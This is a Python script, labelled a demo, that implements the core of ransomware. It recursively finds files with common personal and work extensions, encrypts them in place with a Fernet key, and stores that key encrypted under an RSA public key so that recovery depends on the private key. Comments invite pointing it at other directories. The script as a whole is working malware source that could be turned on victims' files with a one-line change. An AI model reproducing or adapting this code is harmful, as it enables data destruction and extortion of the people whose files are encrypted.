import os
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

CRYPTER: Fernet  # global variable of type Fernet (initially it is null)


def file_seek(parent_path):

    target_extensions = [
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'yml', 'yaml', 'json', 'xml', 'csv',
        'db', 'sql', 'dbf', 'mdb', 'iso', 'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', 'java', 'class', 'jar', 'ps', 'bat', 'vb', 'awk', 'sh', 'cgi',
        'pl', 'ada', 'swift', 'go', 'py', 'pyc', 'bf', 'coffee', 'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # careful, ouchie ouchie
    ]

    for dirpath, dirs, files in os.walk(parent_path):
        
        for f in files:
            
            absolute_path = os.path.abspath(os.path.join(dirpath, f))
            ext = absolute_path.split('.')[-1]
            
            if ext in target_extensions:
                yield absolute_path


def store_encrypted_key():
    global CRYPTER
    
    fernet_key = Fernet.generate_key()
    CRYPTER = Fernet(fernet_key)
    
    with open('fernet_key.txt', 'wb') as fout:
        public_key = RSA.import_key(open('public_key.pem').read())
        encrypted_key = PKCS1_OAEP.new(public_key).encrypt(fernet_key)
        fout.write(encrypted_key)


def decrypt_fernet_key():
    global CRYPTER
    
    with open('fernet_key.txt', 'r+b') as fin:
        encrypted_key = fin.read()
    
    private_key = RSA.import_key(open('private_key.pem').read())
    fernet_key = PKCS1_OAEP.new(private_key).decrypt(encrypted_key)
    
    CRYPTER = Fernet(fernet_key)


def encrypt():
    global CRYPTER
    
    dirs_to_crypt = ['demo_folder']  # change this to whatever directories you want to encrypt
    
    for curr_dir in dirs_to_crypt:
        for file in file_seek(curr_dir):

            with open(file, 'r+b') as fin:
                file_contents = fin.read()
                _file_contents = CRYPTER.encrypt(file_contents)
            
            with open(file, 'wb') as fout:
                fout.write(_file_contents)


def decrypt():
    global CRYPTER
    
    dirs_to_decrypt = ['demo_folder']  # change this to whatever directories you want to decrypt
    
    for curr_dir in dirs_to_decrypt:
        for file in file_seek(curr_dir):
            
            with open(file, 'r+b') as fin:
                file_contents = fin.read()
                _file_contents = CRYPTER.decrypt(file_contents)
    
            with open(file, 'wb') as fout:
                fout.write(_file_contents)


def main():
    # you need to create a key first before encrypting
    store_encrypted_key()
    encrypt()


if __name__ == '__main__':
    main()

    input('This is a demo. Files have been encrypted. Press enter to decrypt.')
    
    # you need to decrypt the encryption key with the public RSA key first
    decrypt_fernet_key()
    decrypt()
